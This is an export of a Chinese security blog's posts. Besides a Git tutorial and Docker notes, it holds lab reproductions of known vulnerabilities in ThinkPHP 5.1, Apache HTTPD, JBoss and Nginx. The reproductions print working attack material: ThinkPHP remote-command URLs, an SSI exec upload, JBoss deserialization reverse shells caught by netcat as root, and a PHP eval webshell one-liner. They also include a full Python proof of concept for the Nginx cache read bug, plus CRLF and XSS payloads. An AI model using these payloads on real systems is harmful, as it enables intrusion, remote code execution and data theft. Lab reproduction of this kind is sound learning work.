<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Git学习（一）]]></title>
    <url>%2F2019%2F09%2F03%2Fgit-xue-xi-yi%2F</url>
    <content type="text"><![CDATA[0x00 前言Git是目前世界上最先进的分布式版本控制系统（没有之一）。 以前写的代码、文档之类的东西用完之后就被我无情抛弃了，以后要用的时候又需要重新写，麻烦，所以就想到了使用Git，将自己的文档、代码托管到GitHub上。 0x01 安装Git在Windows上使用Git，直接从官网上下载安装程序，然后默认选项安装即可。 安装完成后，鼠标右键，出现如下图，说明Git安装成功！ 安装完成后，还需要最后一步设置，鼠标右键“Git bash here”，在命令行输入： $ git config --global user.name &quot;Your Name&quot; $ git config --global user.email &quot;Your Email&quot; 注意: git config命令的–global参数，用了这个参数，表示你这台机器上所有的Git仓库都会使用这个配置，当然也可以对某个仓库指定不同的用户名和Email地址。 0x02 创建版本库什么是版本库呢？版本库又名仓库，英文名repository，可以理解成一个目录，这个目录里面的所有文件都可以被Git管理起来，每个文件的创建、修改、删除，Git都能跟踪，以便任何时刻都可以追踪历史，或者在将来某个时刻可以“还原”。 创建一个版本库也很简单，选择一个合适的地方，创建一个空目录 $ mkdir learnGit $ cd learnGit 通过git init命令把这个目录变成Git可以管理的仓库 $ git init Initialized empty Git repository in F:/PythonProject/.git/ 这样仓库就建好了，但是里面是空的，其实当前目录下多了一个.git文件夹，这个目录是Git用来跟踪管理版本库的，千万不要乱动。 如果没有看到.git文件夹，可能是你把它隐藏了，可以用ls -la查看 0x03 三个工作区 工作区： 指本地创建的目录，主要保存本地文件 暂存区： git add之后文件进入的地方，此时文件还没有进入版本库 版本库： 即仓库，git commit之后，文件从暂存区进入仓库 0x04 小试牛刀我们先编写一个README.txt文件，内容如下： Git is a version control system. This is my first test for Git! 一定要放到learngit目录下（子目录也行），因为这是一个Git仓库，放到其他地方Git找不到这个文件。 第一步，用git add &lt;file&gt;把文件添加到仓库 $ git add README.txt 执行完后没有任何回显，这就对了，Unix的哲学是“没有消息就是好消息”，说明添加成功。 第二步，用git commit提交文件到仓库 $ git commit -m &quot;add a new README.txt file&quot; [master (root-commit) 6881823] add a new README.txt file 1 file changed, 2 insertions(+) create mode 100644 README.txt -m后面是本次提交的说明，可以输入任何内容，也可以不输。 说明： git add一次添加一个文件，git commit可以把多次add的文件一次性提交。 0x05 总结今天主要学习如下： 初始化一个Git仓库，使用git init命令。 添加文件到Git仓库，分两步： 使用命令git add ，注意，可反复多次使用，添加多个文件； 使用命令git commit -m ，完成。 这里要特别强调一下，所有的版本控制系统，其实只能跟踪文本文件的改动，比如TXT文件，网页，所有的程序代码等等，Git也不例外。版本控制系统可以告诉你每次的改动，比如在第5行加了一个单词“Linux”，在第8行删了一个单词“Windows”。而图片、视频这些二进制文件，虽然也能由版本控制系统管理，但没法跟踪文件的变化，只能把二进制文件每次改动串起来，也就是只知道图片从100KB改成了120KB，但到底改了啥，版本控制系统不知道，也没法知道。 不幸的是，Microsoft的Word格式是二进制格式，因此，版本控制系统是没法跟踪Word文件的改动的，前面我们举的例子只是为了演示，如果要真正使用版本控制系统，就要以纯文本方式编写文件。 因为文本是有编码的，比如中文有常用的GBK编码，日文有Shift_JIS编码，如果没有历史遗留问题，强烈建议使用标准的UTF-8编码，所有语言使用同一种编码，既没有冲突，又被所有平台所支持。]]></content>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[thinkPHP5.1漏洞复现]]></title>
    <url>%2F2019%2F08%2F30%2Fthinkphp5-1-lou-dong-fu-xian%2F</url>
    <content type="text"><![CDATA[## 0x01 前言。。。 ## 0x01 docker复现这一块弄了好几天，一直不会用docker复现cms。 利用官方lamp镜像，一开始用的镜像的PHP版本是5.5的，但是thinkPHP5.1需要PHP5.6以上，一直没有成功，后来换了一个镜像PHP7.3的，成功了！！！ 搜索lamp镜像docker search lamp 拉取镜像docker pull mattrayner/lamp 新建docker容器，并映射端口号docker run -d -p [host port]:[docker port][image] 查看运行中的docker容器docker ps -a 进入一个docker容器docker exec -it [container id] bash 拷贝本地文件到dockerdocker cp [本地路径] [container id]:[container 路径] 启动服务service apache2 start service mysql start ## 0x02 命令执行漏洞利用## 漏洞环境thinkPHP5.1.1 php 7.3 (必须5.6+) 靶机IP： 192.168.72.131:89 ## 代码执行：http://192.168.72.131:89/tp5.1/public/?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1 http://192.168.72.131:89/tp5.1/public/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1 ## 命令执行：http://192.168.72.131:89/tp5.1/public/index.php?s=index/\think\Container/invokeFunction&amp;function=call_user_func_array&amp;vars[]=system&amp;vars[1][]=ls%20-l http://192.168.72.131:89/tp5.1/public/index.php?s=index/\think\Container/invokeFunction&amp;function=call_user_func_array&amp;vars[]=system&amp;vars[1][]=whoami ## 文件写入：http://192.168.72.131:89/tp5.1/public/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][1]=%3C?php%20phpinfo();?%3E 访问：http://192.168.72.131:89/tp5.1/public/shell.php ## 0x03 漏洞修复 更新thinkPHP版本 手工修复根据官方给出的方案进行代码修改。https://github.com/top-think/framework/commit/f0f9fc71b8b3716bd2abdf9518bcdf1897bb776 ## 总结]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F08%2F25%2Fdocker-fu-xian-ctf%2Fdocker-fu-xian-ctf%2F</url>
    <content type="text"><![CDATA[docker复现ctf0x00 docker常用命令 拉取镜像 docker pull [image] 查看docker当前镜像 docker image ls docker images 新建docker容器，并映射端口号 docker run -d -p [host port]:[docker port][image] 查看运行中的docker容器 docker ps -a 进入一个docker容器 docker exec -it [container id] bash 拷贝本地文件到docker docker cp [本地路径] [container id]:[container 路径] 启动/停止一个docker容器 docker stop [container id] docker start [container id] 删除一个docker容器（注意:在镜像对应的容器后才可以删除镜像ID） docker rm [container id] 0x01 使用docker搭建一道简单的ctf题目 搜索lamp环境的docker镜像 docker search lamp 拉取”tutum/lamp”镜像 docker pull tutum/lamp 拉取完成后，查看本地docker镜像 docker images]]></content>
  </entry>
  <entry>
    <title><![CDATA[XSS学习]]></title>
    <url>%2F2019%2F08%2F03%2Fxss-xue-xi%2F</url>
    <content type="text"><![CDATA[## 0x00 前言跨站脚本(Cross-Site Scripting,简称为XSS或跨站脚本或跨站脚本攻击)是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种。它允许恶意用户将代码注入网页，其他用户在浏览网页时就会受到影响。恶意用户利用xss代码攻击成功后，可能得到很高的权限、私密网页内容、会话和cookie等各种内容。 XSS攻击可以分为三种： 反射型、存储型和DOM型。 ## 0x01 反射型XSS反射型XSS又称非持久型XSS，这种攻击方式往往具有一次性。 攻击方式： 攻击者通过电子邮件等方式将包含XSS代码的恶意连接发送给目标用户。当目标用户访问该链接时，服务器接收该目标用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段xss代码，就会触发xss漏洞。 ## 0x02 存储型XSS## 0x03 DOM型XSS]]></content>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache漏洞复现]]></title>
    <url>%2F2019%2F08%2F02%2Fapache-lou-dong-fu-xian%2F</url>
    <content type="text"><![CDATA[0x00 前言。。。。。。 0x01 Apache HTTPD 多后缀解析漏洞漏洞说明Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。例如，如下配置文件： AddType text/html .html AddLanguage zh-CN .cn 其给 .html 后缀增加了media-type，值为 text/html；给 .cn 后缀增加了语言，值为 zh-CN 。此时，如果用户请求文件 index.cn.html ，他将返回一个中文的html页面。 以上就是Apache多后缀的特性。如果运维人员给.php后缀增加了处理器： AddHandler application/x-httpd-php .php 那么，在有多个后缀的情况下，只要一个文件含有.php后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。 漏洞复现docker-compose build docker-compose up -d 环境： 稳定版Apache、PHP7.3访问 http://192.168.220.151 会出现一个文件上传页面 先尝试上传一个php文件，上传失败 Unsupported filetype uploaded. 我们可以通过上传文件名为xxx.php.jpg或xxx.php.jpeg的文件，利用Apache解析漏洞进行getshell 上传成功，且没有重命名 0x02 Apache HTTPD 换行解析漏洞（CVE-2017-15715）漏洞说明Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A 将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。 漏洞复现docker-compose build docker-compose up -d 启动后Apache运行在http://192.168.220.151:8080，发现是空白的，什么都没有。此环境并没有前端页面，所以就自己写html表单上传文件。 进入docker里面查看index.php, &lt;?php if(isset($_FILES[&#39;file&#39;])) { $name = basename($_POST[&#39;name&#39;]); $ext = pathinfo($name,PATHINFO_EXTENSION); if(in_array($ext, [&#39;php&#39;, &#39;php3&#39;, &#39;php4&#39;, &#39;php5&#39;, &#39;phtml&#39;, &#39;pht&#39;])) { exit(&#39;bad file&#39;); } move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &#39;./&#39; . $name); } 可以看到这里获取文件名是需要单独post一个name的，因为如果通过 $_FILES[&#39;file&#39;][&#39;name&#39;] 获取文件名的话，会把 \x0a 自动去除，所以 $_FILES[&#39;file&#39;][&#39;name&#39;] 这种方式获取文件名就不会造成这个漏洞。 &lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt; &lt;/form&gt; burp抓包，在Hex选项卡.php后面0d的位置右键-Insert byte，添加一个0a，然后发包，成功上传 浏览器访问 http://192.168.220.151:8080/test.php%0A，正常解析 0x03 Apache SSI 远程命令执行漏洞漏洞说明在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用语法执行任意命令。 漏洞复现docker-compose up -d 环境启动后，访问http://192.168.220.151:8080/upload.php，即可看到一个上传表单。 正常上传PHP文件是不允许的，我们可以上传一个shell.shtml文件： &lt;!--#exec cmd=&quot;id&quot; --&gt; id可以修改为其他命令。 上传成功。]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Apache http漏洞复现]]></title>
    <url>%2F2019%2F08%2F02%2Fapache-lou-dong-fu-xian%2Fapache-http-lou-dong-fu-xian%2F</url>
    <content type="text"><![CDATA[0x00 前言。。。。。。 0x01 Apache HTTPD 多后缀解析漏洞漏洞说明Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。例如，如下配置文件： AddType text/html .html AddLanguage zh-CN .cn 其给 .html 后缀增加了media-type，值为 text/html；给 .cn 后缀增加了语言，值为 zh-CN 。此时，如果用户请求文件 index.cn.html ，他将返回一个中文的html页面。 以上就是Apache多后缀的特性。如果运维人员给.php后缀增加了处理器： AddHandler application/x-httpd-php .php 那么，在有多个后缀的情况下，只要一个文件含有.php后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。 漏洞复现docker-compose build docker-compose up -d 环境： 稳定版Apache、PHP7.3访问 http://192.168.220.151 会出现一个文件上传页面 先尝试上传一个php文件，上传失败 Unsupported filetype uploaded. 我们可以通过上传文件名为xxx.php.jpg或xxx.php.jpeg的文件，利用Apache解析漏洞进行getshell 上传成功，且没有重命名 0x02 Apache HTTPD 换行解析漏洞（CVE-2017-15715）漏洞说明Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A 将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。 漏洞复现docker-compose build docker-compose up -d 启动后Apache运行在http://192.168.220.151:8080，发现是空白的，什么都没有。此环境并没有前端页面，所以就自己写html表单上传文件。 进入docker里面查看index.php, &lt;?php if(isset($_FILES[&#39;file&#39;])) { $name = basename($_POST[&#39;name&#39;]); $ext = pathinfo($name,PATHINFO_EXTENSION); if(in_array($ext, [&#39;php&#39;, &#39;php3&#39;, &#39;php4&#39;, &#39;php5&#39;, &#39;phtml&#39;, &#39;pht&#39;])) { exit(&#39;bad file&#39;); } move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &#39;./&#39; . $name); } 可以看到这里获取文件名是需要单独post一个name的，因为如果通过 $_FILES[&#39;file&#39;][&#39;name&#39;] 获取文件名的话，会把 \x0a 自动去除，所以 $_FILES[&#39;file&#39;][&#39;name&#39;] 这种方式获取文件名就不会造成这个漏洞。 &lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt; &lt;/form&gt; burp抓包，在Hex选项卡.php后面0d的位置右键-Insert byte，添加一个0a，然后发包，成功上传 浏览器访问 http://192.168.220.151:8080/test.php%0A，正常解析 0x03 Apache SSI 远程命令执行漏洞漏洞说明在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用语法执行任意命令。 漏洞复现docker-compose up -d 环境启动后，访问http://192.168.220.151:8080/upload.php，即可看到一个上传表单。 正常上传PHP文件是不允许的，我们可以上传一个shell.shtml文件： &lt;!--#exec cmd=&quot;id&quot; --&gt; id可以修改为其他命令。 上传成功。]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JBOSS漏洞复现]]></title>
    <url>%2F2019%2F08%2F01%2Fjboss-lou-dong-fu-xian%2F</url>
    <content type="text"><![CDATA[## 0x00 前言## 0x01 JBossMQ JMS 反序列化漏洞(CVE-2017-7504)## 漏洞说明Red Hat JBoss Application Server 是一款基于JavaEE的开源应用服务器。JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。 ## 漏洞复现docker-compose up -d 目标： http://192.168.220.151:8080 利用工具： JavaDeserH2HC poc使用方法： 攻击机下载执行执行生成二进制payload文件： javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java #修改接收shell的主机ip和端口 java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.220.133:8080 (IP:端口) curl向被攻击服务器发送攻击payload： curl http://192.168.220.151:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser 我们选择一个Gadget： ExampleCommonsCollections1WithHashMap 编译并生成序列化数据： javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap.java java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap &quot;touch /tmp/success&quot; 执行结果： root@kali:~/桌面/JavaDeserH2HC# javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap.java root@kali:~/桌面/JavaDeserH2HC# java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap &quot;touch /tmp/success&quot; Saving serialized object in ExampleCommonsCollections1WithHashMap.ser 我们执行的命令是touch /tmp/success，执行完成后，将生成一个文件ExampleCommonsCollections1WithHashMap.ser，将该文件作为body发送如下数据包： curl http://192.168.220.151:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ExampleCommonsCollections1WithHashMap.ser 这个过程会产生一些警告，但好像不影响使用 执行 docker exec -ti 容器ID /bin/bash 进入容器 root@0ec136da132e:/opt/jdk# cd /tmp root@0ec136da132e:/tmp# ls hsperfdata_root success 可以利用重定向写入一句话木马: echo &#39;&lt;?php @eval(_POST[&#39;test&#39;]); ?&gt; &gt; /tmp/test.php 执行结果： root@0ec136da132e:/tmp# ls aa.php hsperfdata_root success root@0ec136da132e:/tmp# cat aa.php &lt;?php @eval(_POST[test]); ?&gt; root@0ec136da132e:/tmp# ## 参考 https://github.com/joaomatosf/JavaDeserH2HC ## 0x02 JBoss 5.x/6.x 反序列化漏洞(CVE-2017-12149)## 漏洞说明该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。 ## 漏洞复现docker up -d 初始化完成后访问http://192.168.220.151:8080/即可看到JBoss默认页面该漏洞出现在/invoker/readonly请求中，服务器将用户提交的POST内容进行了Java反序列化 下载poc： https://github.com/joaomatosf/JavaDeserH2HC 使用poc： root@kali:~/桌面/JavaDeserH2HC# javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java root@kali:~/桌面/JavaDeserH2HC# java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.220.133:8888 Saving serialized object in ReverseShellCommonsCollectionsHashMap.ser 在攻击机上开启端口监听： nc -lvvp 8888 listening on [any] 8888 ... 向目标发送payload： root@kali:~/桌面/JavaDeserH2HC# curl http://192.168.220.151:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser &lt;html&gt;&lt;head&gt;&lt;title&gt;JBoss Web/3.0.0-CR2 - Error report&lt;/title&gt;&lt;style&gt;&lt;!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--&gt;&lt;/style&gt; &lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 500 - &lt;/h1&gt;&lt;HR size=&quot;1&quot; noshade=&quot;noshade&quot;&gt;&lt;p&gt;&lt;b&gt;type&lt;/b&gt; Exception report&lt;/p&gt;&lt;p&gt;&lt;b&gt;message&lt;/b&gt; &lt;u&gt;&lt;/u&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;description&lt;/b&gt; &lt;u&gt;The server encountered an internal error () that prevented it from fulfilling this request.&lt;/u&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;exception&lt;/b&gt; &lt;pre&gt;java.lang.ClassCastException: java.util.HashSet cannot be cast to org.jboss.invocation.MarshalledInvocation org.jboss.invocation.http.servlet.ReadOnlyAccessFilter.doFilter(ReadOnlyAccessFilter.java:106) &lt;/pre&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;note&lt;/b&gt; &lt;u&gt;The full stack trace of the root cause is available in the JBoss Web/3.0.0-CR2 logs.&lt;/u&gt;&lt;/p&gt;&lt;HR size=&quot;1&quot; noshade=&quot;noshade&quot;&gt;&lt;h3&gt;JBoss Web/3.0.0-CR2&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;root@kali:~/桌面/JavaDeserH2HC# 反弹shell成功！！！ root@kali:~# nc -lvvp 8888 listening on [any] 8888 ... 192.168.220.151: inverse host lookup failed: Unknown host connect to [192.168.220.133] from (UNKNOWN) [192.168.220.151] 53530 whoami root id uid=0(root) gid=0(root) groups=0(root) ## 参考 https://mp.weixin.qq.com/s/zUJMt9hdGoz1TEOKy2Cgdg https://access.redhat.com/security/cve/cve-2017-12149 ## 0x03 JMXInvokerServlet 反序列化漏洞## 漏洞说明这个漏洞与前两个差别不大，JBoss在处理/invoker/JMXInvokerServlet请求的时候读取了对象。 所以，只要把url改成下面即可： http://192.168.220.151:8080/invoker/JMXInvokerServlet root@kali:~/桌面/JavaDeserH2HC# javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java root@kali:~/桌面/JavaDeserH2HC# java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.220.133:8888 Saving serialized object in ReverseShellCommonsCollectionsHashMap.ser 在攻击机上开启端口监听： nc -lvvp 8888 listening on [any] 8888 ... 向目标发送payload： root@kali:~/桌面/JavaDeserH2HC# curl http://192.168.220.151:8080/invoker/JMXInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser Warning: Binary output can mess up your terminal. Use &quot;--output -&quot; to tell Warning: curl to output it to your terminal anyway, or consider &quot;--output Warning: &lt;FILE&gt;&quot; to save to a file. 有几个警告，不影响操作。 反弹shell成功。 root@kali:~# nc -lvvp 8888 listening on [any] 8888 ... 192.168.220.151: inverse host lookup failed: Unknown host connect to [192.168.220.133] from (UNKNOWN) [192.168.220.151] 41174 whoami root]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx漏洞复现]]></title>
    <url>%2F2019%2F07%2F31%2Fnginx-lou-dong-fu-xian%2F</url>
    <content type="text"><![CDATA[前言Nginx 是一款轻量级的 Web 服务器、反向代理服务器及电子邮件（IMAP/POP3）代理服务器，并在一个 BSD-like 协议下发行。其特点是占有内存少，并发能力强，事实上 nginx 的并发能力确实在同类型的网页服务器中表现较好。 文件名逻辑漏洞(CVE-2013-4547)漏洞说明影响版本 Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7 漏洞说明 这个漏洞其实和代码执行没有太大关系，其主要是因为错误地解析了请求的 URL ，错误地获取到用户请求的文件名，导致出现权限绕过、代码执行的连带影响。 举个例子 Nginx匹配到 .php 结尾的请求，就发送给 fastcgi 进行解析，常见的写法如下： location ~ \.php$ { include fastcgi_params; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /var/www/html$fastcgi_script_name; fastcgi_param DOCUMENT_ROOT /var/www/html; } 正常情况下(关闭pathinfo的情况下)，只有.php后缀的文件才会被发送给fastcgi解析 而存在CVE-2013-4547的情况下，我们构造payload：http://127.0.0.1/test.jpg[0x20][0x00].php注意： 0x20指 (空格)、 0x00指\0(截止符)、 还有一个0x2e指分隔符 这个URL可以匹配上正则 \.php$ ，可以进入这个Location块；但进入之后，Nginx却错误地认为请求的文件是 test.jpg[0x20] ，就设置其为SCRIPT_FILENAME的值发送给 fastcgi 。 fastcgi根据SCRIPT_FILENAME的值进行解析，最后造成了解析漏洞。 所以，我们只需要上传一个空格结尾的文件，即可使PHP解析之。 再举个例子 比如很多网站限制了允许访问后台的IP： location /admin/ { allow 127.0.0.1; deny all; } 我们可以请求如下URL： /test[0x20]/../admin/index.php ，这个URI不会匹配上location后面的 /admin/ ，也就绕过了其中的IP验证；但最后请求的是 /test[0x20]/../admin/index.php 文件，也就是/admin/index.php，成功访问到后台。（注意：这个前提是需要有一个目录叫test：这是Linux系统的特点，如果有一个不存在的目录，则即使跳转到上一层，也会爆文件不存在的错误，Windows下没有这个限制） 漏洞复现启动漏洞环境： docker-compose build docker-compose up -d 靶机IP： 192.168.220.141环境启动后，访问http://192.168.220.141:8080/即可看到一个上传页面。 这个环境是黑名单验证，我们无法上传php后缀的文件，需要利用CVE-2013-4547。我们上传一个123.jpg，注意后面的空格 上传成功，尝试去该路径下访问“123.jpg ”文件，界面报404错误 上传的文件找不到，是因为浏览器自动将空格编码为%20，服务器中找不到名为“test2.jpg%20”的文件 接下来，我们想要上传的jpg文件作为php解析，就需要利用未编码的空格和截止符（\0）进行构造，构造请求如下： http://192.168.220.141:8080/uploadfiles/test.jpgAA.php #AA只是起到占位的作用 发送请求并使用burpsuite抓包。使用burpsuite将AA分别更改为20（空格）、00（截止符\0） 这样我们发送的请求就变为： http://192.168.220.141:8080/uploadfiles/test.jpg[0x20][0x00].php Nginx解析后，将“test.jpg ”文件当做php文件解析。 越界读取缓存漏洞(CVE-2017-7529)漏洞说明Nginx在反向代理站点的时候，通常会将一些文件进行缓存，特别是静态文件。缓存的部分存储在文件中，每个缓存文件包括 “文件头”+“HTTP返回包头”+“HTTP返回包体” 。如果二次请求命中了该缓存文件，则Nginx会直接将该文件中的“HTTP返回包体”返回给用户。 如果我的请求中包含Range头，Nginx将会根据我指定的start和end位置，返回指定长度的内容。而如果我构造了两个负的位置，如(-600, -9223372036854774591)，将可能读取到负位置的数据。如果这次请求又命中了缓存文件，则可能就可以读取到缓存文件中位于“HTTP返回包体”前的“文件头”、“HTTP返回包头”等内容。 漏洞复现docker-compose up -d 靶机IP： 192.168.220.150 访问 192.168.220.150:8080 ，即可查看到Nginx默认页面，这个页面实际上是反向代理的8081端口的内容。 调用python3 poc.py http://your-ip:8080/，读取返回结果： poc.py(基于python3) #!/usr/bin/env python import sys import requests if len(sys.argv) &lt; 2: print(&quot;%s url&quot; % (sys.argv[0])) print(&quot;eg: python %s http://your-ip:8080/&quot; % (sys.argv[0])) sys.exit() headers = { &#39;User-Agent&#39;: &quot;Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240&quot; } offset = 605 # 可以修改 url = sys.argv[1] file_len = len(requests.get(url, headers=headers).content) n = file_len + offset headers[&#39;Range&#39;] = &quot;bytes=-%d,-%d&quot; % ( n, 0x8000000000000000 - n) r = requests.get(url, headers=headers) print(r.text) 执行结果： root@kali:~# python3 poc.py http://192.168.220.150:8080/ --00000000000000000006 Content-Type: text/html; charset=utf-8 Content-Range: bytes -605-611/612 ’;A]b`RY:9A]r«\me&quot;59526062-264&quot; ## KEY: http://127.0.0.1:8081/ ## 缓存文件头 ## HTTP返回头 HTTP/1.1 200 OK Server: nginx/1.13.2 Date: Wed, 31 Jul 2019 06:46:18 GMT Content-Type: text/html; charset=utf-8 Content-Length: 612 Last-Modified: Tue, 27 Jun 2017 13:40:50 GMT Connection: close ETag: &quot;59526062-264&quot; Accept-Ranges: bytes &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Welcome to nginx!&lt;/title&gt; &lt;style&gt; body { width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Welcome to nginx!&lt;/h1&gt; &lt;p&gt;If you see this page, the nginx web server is successfully installed and working. Further configuration is required.&lt;/p&gt; &lt;p&gt;For online documentation and support please refer to &lt;a href=&quot;http://nginx.org/&quot;&gt;nginx.org&lt;/a&gt;.&lt;br/&gt; Commercial support is available at &lt;a href=&quot;http://nginx.com/&quot;&gt;nginx.com&lt;/a&gt;.&lt;/p&gt; &lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt; &lt;/body&gt; &lt;/html&gt; --00000000000000000006 Content-Type: text/html; charset=utf-8 Content-Range: bytes -9223372036854773979-611/612 可见，越界读取到了位于“HTTP返回包体”前的“文件头”、“HTTP返回包头”等内容。 配置错误导致漏洞docker-compose up -d 运行成功后，Nginx将会监听8080/8081/8081三个端口，分别对应三种漏洞。 1. CRLF注入漏洞 2. 目录穿越漏洞 3. add_header被覆盖 CRLF注入漏洞漏洞说明CRLF是回车换行(\r\n)的简称，其十六进制的编码分别是0x0b和0x0a。在http协议中，http消息头以明文的字符串格式传送，以冒号分隔的键/值对，如：Accept-Charset: utf-8，每一个消息头以回车符(CR)和换行符(LF)结尾。而在http消息头结束后，会使用两个连续的CR-LF来进行标识，用来分隔http 消息头 和 http 消息体（请求或响应的内容）。 当一个网站使用https协议的时候，很多站点会强制用户使用https进行访问。当用户访问http的时候会302跳转到https页面。如果使用了 \$uri来进行配置，可能会导致CRLF注入漏洞 Nginx中错误的配置文件示例（原本的目的是为了让http的请求跳转到https上）： location / { return 302 https://$host$uri; } nginx中 \$uri 指的是请求的文件和路径，不会包含后面请求的数据（即?和#后面的数据） nginx服务器会对 $uri 进行解码。当我们在传入的参数后面加入urlencode之后的换行符 %0d%0a ，我们就可以污染HTTP头的数据 举个例子访问http://your_ip/302/123会302跳转到https://your_ip/302/123。这是正常的跳转。但是由于配置文件里面使用的是$uri，会对我们传入的参数进行转码，当我们访问http://your_ip/302/123%0d%0a%0d%0atest=1时，302跳转会指向https://your_ip/302/123并且POST一个参数 test=1 漏洞复现正常发送请求 漏洞利用 会话固定 构造payload http://192.168.220.150:8080/%0d%0aSet-Cookie:%20session=hacker 可以从响应包中看出，我们利用该漏洞成功了控制了cookie 反射型XSS 构造payload http://192.168.220.150:8080/%0d%0a%0d%0a&lt;img src=1 onerror=alert(/xss/)&gt; 我们可以看到响应包中，标签已经插入页面中，但是由于浏览器的Filter是浏览器应对一些反射型XSS做的保护策略，当url中含有XSS相关特征的时候就会过滤掉不显示在页面中，所以不能触发XSS。怎样才能关掉filter？一般来说用户这边是不行的，只有数据包中http头含有X-XSS-Protection并且值为0的时候，浏览器才不会开启filter。 还没成功！！！ 漏洞修复Nginx获取用户请求路径时，有三个可以表示uri的变量： $uri：表示解码以后的请求路径（不带参数） $document_uri：表示解码以后的请求路径（不带参数） $request_uri：表示完整的uri，没有解码 